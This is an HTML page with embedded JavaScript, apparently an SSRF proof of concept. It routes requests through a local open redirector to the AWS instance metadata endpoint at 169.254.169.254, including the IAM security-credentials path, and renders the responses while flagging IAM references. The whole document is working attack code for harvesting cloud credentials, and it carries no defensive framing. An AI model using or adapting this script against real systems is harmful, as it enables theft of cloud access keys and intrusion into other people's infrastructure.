<!DOCTYPE html>
<html>
<head>
    <title>IMSv1 Metadata Test</title>
</head>
<body>
    <h1>Testing AWS Metadata v1.0 via Redirector</h1>
    <div id="results"></div>
    
    <script>
        var results = "";
        
        // Test different metadata service versions
        var endpoints = [
            'http://localhost/redir.php?url=http://169.254.169.254/1.0/meta-data/',
            'http://localhost/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/',
            'http://localhost/redir.php?url=http://169.254.169.254/2007-01-19/meta-data/',
            'http://localhost/redir.php?url=http://169.254.169.254/2008-02-01/meta-data/',
            'http://localhost/redir.php?url=http://169.254.169.254/2009-04-04/meta-data/'
        ];
        
        for(var i = 0; i < endpoints.length; i++) {
            try {
                results += "<h3>Test " + (i+1) + ": " + endpoints[i].split('url=')[1] + "</h3>";
                var xhr = new XMLHttpRequest();
                xhr.open('GET', endpoints[i], false);
                xhr.send();
                results += "<div style='background:#e8f5e8;padding:10px;border:1px solid green;'>‚úÖ SUCCESS: " + xhr.responseText.length + " bytes</div>";
                results += "<pre style='background:#f0f0f0;padding:10px;font-size:11px;'>" + xhr.responseText + "</pre>";
                
                // If this gives us a directory listing, try to get credentials
                if(xhr.responseText.includes('iam') || xhr.responseText.includes('security-credentials')) {
                    results += "<div style='background:#ffff99;padding:5px;'>üîç Found IAM reference, investigating...</div>";
                }
            } catch(e) {
                results += "<div style='background:#ffe8e8;padding:5px;'>‚ùå " + e.message + "</div>";
            }
        }
        
        document.getElementById("results").innerHTML = results;
    </script>
</body>
</html>
